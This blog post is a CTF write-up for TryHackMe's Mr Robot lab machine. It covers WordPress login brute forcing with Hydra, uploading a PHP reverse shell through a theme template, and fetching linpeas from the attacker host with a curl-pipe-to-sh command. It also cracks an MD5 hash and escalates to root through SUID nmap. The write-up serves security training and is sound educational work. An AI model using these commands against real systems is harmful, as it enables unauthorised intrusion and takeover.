---
title: "TryHackMe Mr Robot CTF"
date: 2020-09-11T14:45:30+02:00
categories:
  - blog
tags:
  - CTF
  - infosec
  - TryHackMe
---

The machine that will serve as an initial blog post will be Mr Robot from dear people from TryHackMe. 

## Enumeration
The first thing that I will do is :drumroll:, nmap
```bash
nmap -sS -A -Pn -sC -oA mrrobot-default-fingerprint-def-scripts <ip_address>
```

The output suggests that we have Apache web server station there.
```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
```

Ok. Now we're firing up dirstalk to bruteforce files and folders, since it's so damn slow, I usually bruteforce only 1 level deep links.<br />
```bash
dirstalk scan http://<ip_address> --scan-depth 0 --dictionary <abs_path>/common.txt
--out ./dirstalk_depth_1.txt
```

After some fancy **jq** command line processing:
```bash
jq 'select( .StatusCode == 200) | .URL.Scheme + "://" + .URL.Host + .URL.Path' 
dirstalk_depth_1.txt
```
we get some links:
```
"http://10.10.187.65/favicon.ico"
"http://10.10.187.65/index.html"
"http://10.10.187.65/intro"
"http://10.10.187.65/license"
"http://10.10.187.65/readme"
"http://10.10.187.65/robots"
"http://10.10.187.65/robots.txt"
"http://10.10.187.65/sitemap"
"http://10.10.187.65/sitemap.xml"
"http://10.10.187.65/wp-config"
"http://10.10.187.65/wp-cron"
"http://10.10.187.65/wp-links-opml"
"http://10.10.187.65/wp-load"
"http://10.10.187.65/wp-login"
```
It's obviously a Wordpress site.

## Doing stuff
We also go thorough all the directories and an interesting _robots.txt_ pops-up.
![robots.txt](/assets/images/robotstxt.png)

Link _key-1-of-3.txt_ has a first key. EZ.
Link fsocity.dic has a dictionary of words. We download it for a later use.
After that we go to the login form on `http://10.10.187.65/wp-login` and we see that it has no brute-force protection.<br />
![wp-login](/assets/images/wplogin.png)

We then strolled through the wordlist _fsocity.dic_ and compile a list of potential usernames like:
* Robot
* Elliot
* mrrobot
* Alderson
* admin
* LeverageGuru

We then try those usernames and we get different error message for user Elliot:
![wp-login](/assets/images/elliot_username.png)

Ok, we can brute force that with Hydra.

## Bruteforce

So, we will try to catch request and response in order to be able to pass that info to Hydra. In order for this to work, we need to find the way the app presents an error message so we can pass that info to Hydra.
Lets catch request that solicits failed response with Hydra.
![burp_request](/assets/images/burp_request.png)
![burp_response](/assets/images/burp_response.png)

We also need to make sure that our dictionary is processed prior to bruteforce so, shell trimming time.
```bash
sort fsocity.dic | uniq > fsocity.dic.uniq
```
We got only 11451 instead of 858160 words which is way more reasonable.

And the command to start bruteforcing will be:
```shell
hydra -l Elliot -P fsocity.dic.uniq <ip_address> http-post-form 
"/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 20
```

We found the password, I'll skip it here so I don't spoil all the fun.

## Wordpress admin console
After that we get WP console, and yes, it's an admin one.
Now we just need to upload our PHP reverse shell to the WP admin in order to get a shell. There are two ways:
1. Use Metasploit's exploit/unix/webapp/wp_admin_shell_upload
2. Inject code into WP theme

We'll do the second one.
We'll go to Appearance, then choose theme (twentyfifteen) and edit the template which will be php reverse shell from our friends from PentestMonkey. DuckDuckGo it, for multiple reasons but mainly because Google is trying to hide "malicious" code from PM.
We just change the IP address and the port and then upload the shell as a new template.
![twentyfifteen](/assets/images/twentyfifteen.png)

We then visit `http://10.10.132.29/wordpress/wp-content/themes/twentyfifteen/404.php` and, voila, we got the shell.

After we obtain a shell, we'll make it more stable by adding tty using ptyhon:
```bash
python -c "import pty;pty.spawn('/bin/sh');"
```
So, we're user deamon and there is a 2nd key in /home/robot that i cannot read. However, _password.raw-md5_ is readable.
![daemon-shell](/assets/images/daemon_shell.png)
![key-2-of-3](/assets/images/key-2-of-3.png)

### Cracking
We crack that MD5 password with:
```bash
./john --format=Raw-MD5 hash.txt --wordlist=fsocity.dic --rules
```
We get password for user _robot_.
Allright.
Now we can read the second key. One more left.

## Privilege escalation
First thing we do is use the great PEASS suite for Linux privilege escalation.
We raise HTTP server on our machine and fetch and run script on machine.
```bash
python -m http.server 80
```
```bash
curl 10.9.147.250/linpeas.sh | sh
```

There's a lot of lines here, but the ones we're interested in are the following:
```bash
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/bin/ping
/bin/umount  --->  BSD/Linux(08-1996)
/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/ping6
/bin/su
/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/newgrp  --->  HP-UX_10.20
/usr/bin/chsh
/usr/bin/chfn  --->  SuSE_9.3/10
/usr/bin/gpasswd
/usr/bin/sudo  --->  /sudo$
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
```

If you go to GTFObins and look for bins listed here, you'll find that **nmap** can spawn system shell. Since it's SUID root, we can obtain root shell that way.
Let's see what version **nmap** is:
```bash
robot@linux:~$ nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

Nice. We can do `nmap --interactive`.

```bash
nmap --interactive
> !sh
```
Win. We do `find / key-3-of-3.txt` and it's in /root folder. 







